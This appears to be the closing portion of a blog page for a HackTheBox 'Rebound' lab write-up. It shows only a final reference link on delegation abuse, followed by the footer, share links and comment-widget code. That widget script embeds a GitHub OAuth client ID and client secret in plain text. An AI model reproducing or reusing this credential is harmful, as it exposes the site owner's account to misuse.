<li>Resource-Based Constrained Delegation Abuse<br><a href="https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/" target="_blank" rel="noopener">https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/</a></li>
</ul>

        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    最后更新时间：<time datetime="2024-04-01T02:58:07.392Z" itemprop="dateUpdated">2024-04-01 10:58:07</time>
</span><br>


        
        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
        
    </div>
    
    <footer>
        <a href="https://darkwing.moe">
            <img src="/img/avatar.jpg" alt="暗羽">
            暗羽
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2023/09/14/Rebound-HackTheBox/&title=《Rebound - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2023/09/14/Rebound-HackTheBox/&title=《Rebound - HackTheBox》 — 喵喵喵喵&source=木を植える最も良い時期は、10年前である。次にいい時期は今である。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2023/09/14/Rebound-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Rebound - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2023/09/14/Rebound-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2023/09/14/Rebound-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2023/09/25/Clicker-HackTheBox/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Clicker - HackTheBox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2023/09/13/Wifinetic-HackTheBox/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Wifinetic - HackTheBox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'd35074a248599729ad26',
          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
          repo: 'BlogComments',
          owner: 'zjicmDarkWing',
          admin: ['zjicmDarkWing'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
        </p>
    </div>
    <div class="bottom">
        <p><span>暗羽 &copy; 2014 - 2025</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2023/09/14/Rebound-HackTheBox/&title=《Rebound - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2023/09/14/Rebound-HackTheBox/&title=《Rebound - HackTheBox》 — 喵喵喵喵&source=木を植える最も良い時期は、10年前である。次にいい時期は今である。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2023/09/14/Rebound-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Rebound - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2023/09/14/Rebound-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2023/09/14/Rebound-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACLUlEQVR42u3awY6DMAxF0f7/TzPSrDoqhfucgAbnZoUQ0Jws3NjO64XH9jver9/vHD/z+fzx9eeXpw0ZMmQ8lrEdDj7Fb88TWLocO+/KkCFjAUb6ueN3vwVQ8m76jAwZMmSQZ8ggPL5MMmTIkEHSSz4VHoJv/d+QIUPGAxkkKU2LbjyJHUmYZciQsQKj1hi45/ry/oYMGTL+PWMLBy/6j2w041nJkCGjNYOkkeQ+OSqRLgpPemXIkNGbUQxtYDOXHtdIE+OdUCtDhoymjFoorLUn08NhJJ2WIUOGjCt4/E5cjJMhQ0ZrBj8SwUPnSBuylgzLkCGjK6OWoI6zx5fsz9xkyJCxACM9YMEDbi28xiQZMmS0ZqSBj/cNyRd4WzTYPsqQIaMdIy1p8VJ+iqkd+5AhQ8YKDL45m3WYrJYeo6qhDBkymjK4NT00RhaIbxBPFk6GDBnLMHjhnt9PeaRFcdIYkCFDRjtGrRmQ/sA2aQQBWoYMGU0ZVwTWNEnmGBkyZKzD4CX7dOrpkYs0fS32K2TIkPFYBkka+cGs2hfSwtxOwJUhQ0ZTxqxifbADHQjEJ2/JkCGjKaNW8CL30wQ4DegyZMhYh1FLI0cAtd+KW5gyZMhox0hTSrIqfLs567iGDBkyVmDwIDseWG9qD8iQIWNJxvF1ugQjxbtiY0CGDBmLMa5IUEcaqzJkyFiBMasZQKi89B8ktzJkyGjNuCLt5JOohfUJLUwZMmQ8g/EDTevRP51lYUYAAAAASUVORK5CYII=" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = '死鬼去哪里了！';
            clearTimeout(titleTime);
        } else {
            document.title = '(つェ⊂)咦!又好了!';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
